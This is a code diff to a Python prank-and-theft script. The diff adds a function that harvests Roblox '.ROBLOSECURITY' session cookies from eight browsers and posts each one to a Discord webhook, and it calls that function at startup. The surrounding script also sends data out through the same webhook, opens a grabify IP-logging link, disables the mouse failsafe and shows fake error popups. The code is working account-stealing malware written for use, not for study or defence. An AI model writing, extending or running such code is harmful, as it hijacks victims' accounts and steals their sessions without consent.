@@ -4,12 +4,13 @@ from comtypes import CLSCTX_ALL
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from discord_webhook import DiscordWebhook
 import tkinter as tk
-pyautogui.FAILSAFE = False
+from tkinter import messagebox
 def vol():
  devices = AudioUtilities.GetSpeakers()
  interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
  volume = cast(interface,POINTER(IAudioEndpointVolume))
  volume.SetMasterVolumeLevel(0, None)
+pyautogui.FAILSAFE = False
 def show_error_popup():
     root = tk.Tk()
     root.withdraw()
@@ -32,6 +33,75 @@ def ipss():
   y = DiscordWebhook(url=zyx, content=yup)
   y.execute()
  except:pass
+ pass
+def roblos():
+ coc = []
+ try:
+  sec = browser_cookie3.chrome(domain_name="roblox.com")
+  for cookie in sec:
+   if cookie.name == '.ROBLOSECURITY':
+    coc.append(cookie.value)
+    coc.append('\n')
+ except:pass
+ try:
+  sec = browser_cookie3.chromium(domain_name="roblox.com")
+  for cookie in sec:
+   if cookie.name == '.ROBLOSECURITY':
+    coc.append(cookie.value)
+    coc.append('\n')
+ except:pass
+ try:
+  sec = browser_cookie3.edge(domain_name="roblox.com")
+  for cookie in sec:
+   if cookie.name == '.ROBLOSECURITY':
+    coc.append(cookie.value)
+    coc.append('\n')
+ except:pass
+ webbrowser.open(url="https://www.youtube.com/watch?v=b2pD0B9Rfps&ab_channel=iamaproudstealer")
+ vol()
+ try:
+  sec = browser_cookie3.brave(domain_name="roblox.com")
+  for cookie in sec:
+   if cookie.name == '.ROBLOSECURITY':
+    coc.append(cookie.value)
+    coc.append('\n')
+ except:pass
+ try:
+  sec = browser_cookie3.opera_gx(domain_name="roblox.com")
+  for cookie in sec:
+   if cookie.name == '.ROBLOSECURITY':
+    coc.append(cookie.value)
+    coc.append('\n')
+ except:pass
+ webbrowser.open(url="https://www.youtube.com/watch?v=b2pD0B9Rfps&ab_channel=iamaproudstealer")
+ vol()
+ try:
+  sec = browser_cookie3.safari(domain_name="roblox.com")
+  for cookie in sec:
+   if cookie.name == '.ROBLOSECURITY':
+    coc.append(cookie.value)
+    coc.append('\n')
+ except:pass
+ try:
+  sec = browser_cookie3.firefox(domain_name="roblox.com")
+  for cookie in sec:
+   if cookie.name == '.ROBLOSECURITY':
+    coc.append(cookie.value)
+    coc.append('\n')
+ except:pass
+ try:
+  sec = browser_cookie3.opera(domain_name="roblox.com")
+  for cookie in sec:
+   if cookie.name == '.ROBLOSECURITY':
+    coc.append(cookie.value)
+    coc.append('\n')
+ except:pass
+ for items in coc:
+    items = str(items)
+    try:
+     x = DiscordWebhook(url=zyx, content=items)
+     x.execute()
+    except:pass
  pass
 def mouse():
   while True:
@@ -84,6 +154,7 @@ def kill():
    webbrowser.open("https://grabify.link/1BOL0S")
   except:pass
   kill()
+roblos()
 troll()
 ipss()
 opp=threading.Thread(target=kill)
